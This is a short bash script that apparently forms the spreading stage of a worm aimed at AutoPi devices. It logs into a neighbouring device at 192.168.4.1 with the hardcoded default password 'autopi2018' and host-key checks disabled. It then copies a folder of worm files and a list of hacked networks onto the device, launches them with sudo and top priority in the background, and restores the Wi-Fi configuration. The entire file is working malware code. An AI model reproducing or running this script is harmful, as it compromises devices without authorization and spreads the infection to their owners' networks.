#!/bin/bash

#Hand over hacked networks
cp hacked_networks hack_folder/

# Removing AutoPi's own subnet route
ip route del 192.168.4.0/24 via 0.0.0.0 metric 100 dev uap0 >> log.dumpexec 2>&1

# Don't infect if worm already is on AutoPi
if [[ $(sshpass -p 'autopi2018' ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no pi@192.168.4.1 'ls') != *"hack_folder"* && $? == 0 ]] 
then
    
    # Send over worm files
    sshpass -p 'autopi2018' scp -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -r hack_folder pi@192.168.4.1:/home/pi >> log.dumpexec 2>&1

    #Run executing commands of the worm
    sshpass -p 'autopi2018' ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -t pi@192.168.4.1 'cd hack_folder; sudo cp * ../; cd /usr/local/bin; sudo ln /home/pi/start.sh; cd /home/pi; sudo setsid nice --20 ./start.sh &> /dev/null & exit' >> log.dumpexec 2>&1

    # Reset wpa_supplicant config file
    rm /etc/wpa_supplicant/wpa_supplicant.conf
    mv /etc/wpa_supplicant/wpa_supplicant.conf.bak /etc/wpa_supplicant/wpa_supplicant.conf

    # Reset wpa_supplicant so that old config is used
    pkill -f -- "wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf"
    systemctl restart dhcpcd
    wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf

    exit 0

fi

# Reset wpa_supplicant config file
rm /etc/wpa_supplicant/wpa_supplicant.conf
mv /etc/wpa_supplicant/wpa_supplicant.conf.bak /etc/wpa_supplicant/wpa_supplicant.conf

# Reset wpa_supplicant so that old config is used
pkill -f -- "wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf"
systemctl restart dhcpcd
wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf

exit 1


